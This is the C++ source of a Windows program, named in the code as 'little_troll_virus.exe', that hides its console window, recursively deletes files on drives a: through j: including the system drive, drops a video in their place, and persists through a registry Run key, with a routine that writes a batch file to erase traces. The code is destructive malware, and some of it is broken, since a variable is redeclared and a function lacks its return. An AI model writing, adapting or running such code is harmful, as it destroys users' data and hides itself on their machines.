#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sys/types.h>
#include <sys/stat.h>
#include <direct.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <winsock2.h>
#include <sstream>
#include <cstdlib>
#include <cstdio>
using namespace std;
int add(const char *path, const char *name)
{
  HKEY key;
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
  RegSetValueEx(key, name, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
   RegCloseKey(key);
   return 0;
}
int clear(const char *name)
{
  string a = "@echo off \n rm a.exe \n rm video.mp4";
  HKEY key;
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
  RegDeleteValue(key, name);
  RegCloseKey(key);
  string const file = "suppr.bat";
  std::ofstream outfile(file.c_str(),ofstream::binary);
  if (outfile)
  {
    outfile << a << endl;
    exit(0);
  }
  return 0;
}

int copie(string fichier, string flux)
{
  std::ifstream infile(fichier.c_str(),ifstream::binary);
  std::ofstream outfile(flux.c_str(),ofstream::binary);
  infile.seekg(0,infile.end);
  long size = infile.tellg();
  infile.seekg (0);
  char* buffer = new char[size];
  infile.read (buffer,size);
  outfile.write (buffer,size);
  delete[] buffer;
  outfile.close();
  infile.close();
}
bool verif(string file)
{
  struct stat file_stat;
  std::string str = file;
  char const *c = str.data();
  if (stat(c ,&file_stat) >= 0)
  {
    return true;
  }
  else
  {
    return false;
  }
}
void suppr(const char* chemin)
{
  DIR* rep = opendir(chemin);
  struct dirent* f = NULL;
  char *nouveau_chemin = NULL;
  while ((f = readdir(rep)) != NULL)
  {
    if(strcmp(f->d_name, ".") && strcmp(f->d_name, ".."))
    {
      nouveau_chemin = (char*)malloc(strlen(chemin)+strlen(f->d_name)+2);
      sprintf(nouveau_chemin, "%s/%s\0", chemin, f->d_name);
      if (strchr(f->d_name, '.') != NULL)
      {
        remove(nouveau_chemin);
      }
      else
      {
        suppr(nouveau_chemin);
        free(nouveau_chemin);
      }
    }
  }
  rmdir(chemin);
  closedir(rep);
}
int copy(string output_file, string file1)
{
  if (verif(file1) == true)
  {
    std::string str1 = output_file + "\\restauration.mp4";
    if (verif(str1) == false)
    {
      std::string fichier("C:\\Users\\Public\\Pictures\\video.mp4");
      std::string outputfile = output_file + "\\restauration.mp4";
      const char* output_file12 = output_file.data();
      suppr(output_file12);
      copie(fichier, outputfile);
      add("C:\\Users\\Public\\Pictures\\little_troll_virus.exe", "usb");
    }
  }
  return 0;
}
int main()
{
  int verif = 0;
  ShowWindow(GetConsoleWindow(), SW_HIDE);
  while (1==1)
  {
	  if (verif == 0)
    {
      string output_file45("a:\\");
      copy(output_file45, output_file45);
      string output_file45("b:\\");
      copy(output_file45, output_file45);
      string output_file45("c:\\");
      copy(output_file45, output_file45);
      string output_file45("d:\\");
      copy(output_file45, output_file45);
      string output_file("e:\\");
      copy(output_file, output_file);
      string output_file1("f:\\");
      copy(output_file1, output_file1);
      string output_file2("g:\\");
      copy(output_file2, output_file2);
      string output_file3("h:\\");
      copy(output_file3, output_file3);
      string output_file4("i:\\");
	    copy(output_file4, output_file4);
      string output_file5("j:\\");
      copy(output_file5, output_file5);
    }
    else
    {
      clear("usb");
    }
	}
	return 0;
}

